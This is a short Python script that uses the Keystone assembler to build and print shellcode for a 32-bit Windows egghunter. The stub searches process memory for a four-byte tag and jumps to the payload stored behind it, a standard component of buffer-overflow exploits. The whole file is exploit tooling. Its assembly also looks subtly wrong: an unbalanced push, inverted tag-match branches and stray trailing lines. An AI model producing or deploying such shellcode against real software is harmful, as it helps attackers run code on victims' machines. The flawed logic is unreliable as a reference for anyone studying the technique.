from keystone import *

def hunter(code):
    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, _ = ks.asm(code)
    instructions = ""
    for dec in encoding: 
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
    print(instructions)
    return instructions.encode()

code = '''
    next_page:
    or dx,0x0fff            ;
    next_address:
    inc edx                 ;
    push edx                ;
    xor eax,eax             ;
    mov al, 0x29            ;
    int 0x2e                ;
    cmp al,5                ;
    je next_page            ;
    mov eax, 0x434c574b     ;
    mov edi, edx            ;
    scasd                   ;
    jz next_address         ;
    scasd                   ;
    jz next_address         ;
    jmp edi                 ;
    call next_page          ;
'''


print("Shellcode: ", end="")
hunter(code)
"++++++++++++++++++++++++++++"
print("DEBUG")
# debug(code)